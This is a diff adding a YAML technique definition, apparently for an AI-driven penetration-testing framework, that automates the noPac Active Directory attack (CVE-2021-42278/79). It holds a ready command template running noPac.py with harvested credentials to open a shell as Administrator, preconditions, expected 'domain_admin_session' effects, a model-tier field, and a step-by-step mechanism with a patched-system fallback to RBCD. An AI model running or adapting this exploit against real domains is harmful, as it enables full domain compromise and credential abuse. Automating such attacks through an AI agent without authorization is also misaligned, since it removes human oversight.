@@ -1,0 +1,30 @@
+name: nopac
+category: ad
+description: noPac (CVE-2021-42278/79) — sAMAccountName spoofing for instant DA
+preconditions:
+- domain_joined
+- has_cred
+- machine_account_quota_positive
+parameters:
+  target_ip: from_engagement.target_ip
+  domain: from_engagement.domain
+  username: from_cred.username
+  password: from_cred.password
+command_template: noPac.py '{domain}/{username}:{password}' -dc-ip {target_ip} -dc-host '{dc_hostname}' -shell --impersonate Administrator -use-ldap
+parser: impacket_parser
+expected_effects:
+- domain_admin_session
+- nopac_exploited
+- has_cred
+falsifier:
+  pattern: STATUS_USER_EXISTS|MachineAccountQuota|patched|denied
+  timeout: 60
+model_tier: sonnet
+mechanism: |
+  CVE-2021-42278 + CVE-2021-42287. Create a computer account `PWNED$`, rename it to
+  `DC` (no $), request TGT for it (KDC falls through to legitimate DC$), then S4U2self
+  for Administrator using the cifs/host SPN. Domain Admin in seconds against unpatched
+  DCs. Adaptation: if patched, fall back to RBCD via the same machine account.
+references:
+  ocd_mindmap: 'Branch 9: noPac / sAMAccountName spoofing (CVE-2021-42278/79)'
+  hacktricks: windows-hardening/active-directory-methodology/sam-name-impersonation.md
